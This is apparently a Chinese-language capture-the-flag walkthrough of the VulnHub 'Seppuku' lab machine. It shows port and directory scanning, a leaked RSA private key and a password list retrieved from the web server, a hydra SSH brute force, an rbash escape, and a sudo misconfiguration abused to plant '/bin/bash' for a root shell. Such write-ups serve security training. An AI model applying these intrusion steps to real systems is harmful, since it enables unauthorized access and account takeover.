# Seppuku

> https://download.vulnhub.com/seppuku/Seppuku.zip

靶场IP：`192.168.2.139`

扫描对外端口服务

```
┌──(root💀kali)-[~]
└─# nmap -p1-65535 -sV 192.168.2.139                                                                                                                                                                                                  
Starting Nmap 7.91 ( https://nmap.org ) at 2022-09-13 08:06 EDT
Nmap scan report for 192.168.2.139
Host is up (0.00077s latency).
Not shown: 65527 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http        nginx 1.14.2
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
7080/tcp open  ssl/http    LiteSpeed httpd
7601/tcp open  http        Apache httpd 2.4.38 ((Debian))
8088/tcp open  http        LiteSpeed httpd
MAC Address: 00:0C:29:6E:A5:CE (VMware)
Service Info: Host: SEPPUKU; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.73 seconds

```

FTP不支持匿名登陆

```
┌──(root💀kali)-[~]
└─# ftp 192.168.2.139
Connected to 192.168.2.139.
220 (vsFTPd 3.0.3)
Name (192.168.2.139:root): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.

```

访问80端口

![image-20220913201456002](../../.gitbook/assets/image-20220913201456002.png)

访问7080端口

![image-20220913201520194](../../.gitbook/assets/image-20220913201520194.png)

访问7601

![image-20220913201559841](../../.gitbook/assets/image-20220913201559841.png)

访问8088

![image-20220913201616166](../../.gitbook/assets/image-20220913201616166.png)

爆破目录

```
┌──(root💀kali)-[~]
└─# dirb http://192.168.2.139:7601                                                                                                                                                                                                    255 ⨯

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Tue Sep 13 08:18:07 2022
URL_BASE: http://192.168.2.139:7601/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://192.168.2.139:7601/ ----
==> DIRECTORY: http://192.168.2.139:7601/a/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/b/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/c/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/ckeditor/                                                                                                                                                                                         
==> DIRECTORY: http://192.168.2.139:7601/d/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/database/                                                                                                                                                                                         
==> DIRECTORY: http://192.168.2.139:7601/e/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/f/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/h/                                                                                                                                                                                                
+ http://192.168.2.139:7601/index.html (CODE:200|SIZE:171)                                                                                                                                                                                 
==> DIRECTORY: http://192.168.2.139:7601/keys/                                                                                                                                                                                             
==> DIRECTORY: http://192.168.2.139:7601/production/                                                                                                                                                                                       
==> DIRECTORY: http://192.168.2.139:7601/q/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/r/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/secret/                                                                                                                                                                                           
+ http://192.168.2.139:7601/server-status (CODE:403|SIZE:280)                                                                                                                                                                              
==> DIRECTORY: http://192.168.2.139:7601/t/                                                                                                                                                                                                
==> DIRECTORY: http://192.168.2.139:7601/w/     
```

访问：`/keys/`

![image-20220913202011396](../../.gitbook/assets/image-20220913202011396.png)

```
┌──(root💀kali)-[~]
└─# curl http://192.168.2.139:7601/keys/private
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAypJlwjKXf0F4YvL2gfwvoUuvB7fuGMMfCe41gLCsTsleOUy2
CJX+oNwVVKPpl6TYI4nXPGbiwfGzoxm0FZa7D9yr83OgwuvMMp83OkVcwL9v+x7a
tK8AAVZ0NjvOPGkvEhB2rPS2mKg1xRKXCM7pA0KSOoDbk9coOpadjg4G0f1YPWrw
p6iLfIErfY2+5hS7QyTQpuRmHuR4eKLF1NFRp8gYuNCVtr0n2Uu6hWuI7RWBGQZJ
Joj8LKjfRRYmKGpyqiGTdRy+8yCyAuT55shuCzXuc+/3HE2jACOD8+pSPKjwxzm4
fuaSfBTUkHfyhiSKIkop2YfIDLKRPM8dGn5zuQIDAQABAoIBADM+s7Vb3Q1ZP54w
foHFjTsNjVqzge0Lt1doxmomx4Aq2sY+DLLBVyfUZSUDTj2JexAKd8OU93o+rcXt
46uudOX/WhR9RMbqpb6MnokEMQGlrCtn08Xvm127RCzQFk0cAsdcGNmKEoMt0mRn
XoPg6/tiJOHd5S5SOKARqAveqoUGUYI3xgsiRpj8CCRIDUgHi9J0++qUeauVw3m3
lvyTnUTw0uf5+sRkI173CUY+ygJapGM7Lg59xzcjEq5H4so0IztQo3o/pOIfeS6W
bqIpY7D63YBGLgpi9JcN/d2bSfafkfhcrAcjPjRXwEFPmYjMbsTBOKcTtCSDVo6/
ho6fTl0CgYEA9F1uIkqxFKIMt2/uK4/1gPOXy/1cjxcsFoah0Ql7d0gj26H6AgXk
nPncIoO1kojPnB+TUy4qz+Bd7teDbkHSaWNJYIVJZQbvskstwgL4+XamiWrJA/Jp
h7y0I0zRxCMBj5yhBNrp6P+f8vtVMpjbKV17jfe6aakfyuayPugHHh8CgYEA1DeM
4lR/+/fUbxtws+aTx8h9TwisYq38D39KNsWkynnb+9pnLCbVbVETtv4sfD/aQfah
R7CxOG+mD4Vryjpk/wwzZeUDzcQpiTx4RsgP6MkFU8knORKfBdimaUpiasWlNWgy
caXR/iA6EmA4jht8vf/+UOUV8GXV9VqDIWUhgycCgYEAvJaGcqyWMUhG7CLT+oal
f5l/Iw0rq7rEabYJmBvrT0k7czt0iK8nmgYy3+gp7ybqoqCzwFQ28itEExn78tGV
o4Pek0EKPY+22TCv5bUJlOz+5bql3AfvbbQyibO1h9tETyMgGXEhaJIvTQSu4deZ
/DiLLCttkDHXuW2FTosfQx0CgYEAkhGOSjapRRBHSxaTE3Cw5UFNZvnsVZu1tCEE
PwD5NVh9HzQr8YrlOnIk5L68deUpYF/WkNbAlLzcizBlifN5kseeFRN188qCYHCb
xPRtZuf+X7ZD5he4FzkRCcXmSeGynjkTB4CAMq+R6RYLt1yaFtk9/gZAfJBLna5o
NbM7Rt8CgYA5oPRfIpKZ5G9LJEAsBUONgBsrpXs+816ZEvBGsqPs/NPhhZMFetKm
RXxYAiEUudMsahP4Woeuxy8kWfM2J2ltwC/HRFuKnKfsHBhsn/FilspYfrafr985
tFnL/K9Z8le1saEGjwCu6zKto7CaFjj2D4Y9ji0sHGBO+tVbtmU/Jg==
-----END RSA PRIVATE KEY-----

```

访问：`/secret/`

![image-20220913201952453](../../.gitbook/assets/image-20220913201952453.png)

```
┌──(root💀kali)-[~]
└─# curl http://192.168.2.139:7601/secret/hostname 
seppuku
```

```
──(root💀kali)-[/tmp]
└─# wget http://192.168.2.139:7601/secret/password.lst 
```

对`seppuku`用户爆破

```
┌──(root💀kali)-[/tmp]
└─# hydra -l seppuku -P password.lst ssh://192.168.2.139
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-13 08:22:47
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 93 login tries (l:1/p:93), ~6 tries per task
[DATA] attacking ssh://192.168.2.139:22/
[22][ssh] host: 192.168.2.139   login: seppuku   password: eeyoree
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 4 final worker threads did not complete until end.
[ERROR] 4 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-13 08:23:01

```

ssh登录

```
┌──(root💀kali)-[/tmp]
└─# ssh seppuku@192.168.2.139                                                                                                                                                                                                         
seppuku@192.168.2.139's password: 
Linux seppuku 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed May 13 10:52:41 2020 from 192.168.1.48
seppuku@seppuku:~$ id
uid=1000(seppuku) gid=1000(seppuku) groups=1000(seppuku),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)

```

查看sudo列表

```
seppuku@seppuku:~$ sudo -l
Matching Defaults entries for seppuku on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User seppuku may run the following commands on seppuku:
    (ALL) NOPASSWD: /usr/bin/ln -sf /root/ /tmp/

```

查看：`.passwd`

```
seppuku@seppuku:~$ ls -al
total 32
drwxr-xr-x 3 seppuku seppuku 4096 May 13  2020 .
drwxr-xr-x 5 root    root    4096 May 13  2020 ..
-rw------- 1 seppuku seppuku    8 May 13  2020 .bash_history
-rw-r--r-- 1 seppuku seppuku  220 May 13  2020 .bash_logout
-rw-r--r-- 1 seppuku seppuku 3526 May 13  2020 .bashrc
drwx------ 3 seppuku seppuku 4096 May 13  2020 .gnupg
-rw-r--r-- 1 root    root      20 May 13  2020 .passwd
-rw-r--r-- 1 seppuku seppuku  807 May 13  2020 .profile
seppuku@seppuku:~$ cat .passwd
12345685213456!@!@A
```

rbash需要转义

```
seppuku@seppuku:~$ cd /home
-rbash: cd: restricted
seppuku@seppuku:~$ 
```

```
──(root💀kali)-[/tmp]
└─# ssh seppuku@192.168.2.139 -t bash                                                                                                                                                                                   
seppuku@192.168.2.139's password: 

```

切换到`samurai`用户

```
seppuku@seppuku:/home$ su samurai
Password: 
samurai@seppuku:/home$ 
samurai@seppuku:/home$ sudo -l
Matching Defaults entries for samurai on seppuku:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User samurai may run the following commands on seppuku:
    (ALL) NOPASSWD: /../../../../../../home/tanto/.cgi_bin/bin /tmp/*

```

如果您还记得我们在执行目录暴力破解时枚举了私钥，这里我复制了在 dirb 扫描期间在 key 中找到的私有文件的内容，并将其保存到一个名为 sshkey 的空文件中，具有 chmod 600 权限。

```
┌──(root💀kali)-[/tmp]
└─# ssh -i id_rsa tanto@192.168.2.139 -t bash  
```

以 tanto 登录后，我们寻找将通过 sudo 用户执行的 `.cgi_bin` 目录，但不幸的是，我无法找到该目录，因此我创建了一个目录为 `.cgi_bin` 并将 bash 脚本保存在名为"bin"的文件中" 通过它获取 bash shell。

```
mkdir .cgi_bin
cd .cgi_bin/
echo "/bin/bash" > bin
chmod 777 bin
ls -la
```

![image-20220913203411669](../../.gitbook/assets/image-20220913203411669.png)

现在是时候利用 `.cgi_bin` 程序了，因此我们再次登录为 Samurai 并运行以下命令并获取 root shell 并通过捕获 root 标志完成挑战

![image-20220913203445885](../../.gitbook/assets/image-20220913203445885.png)
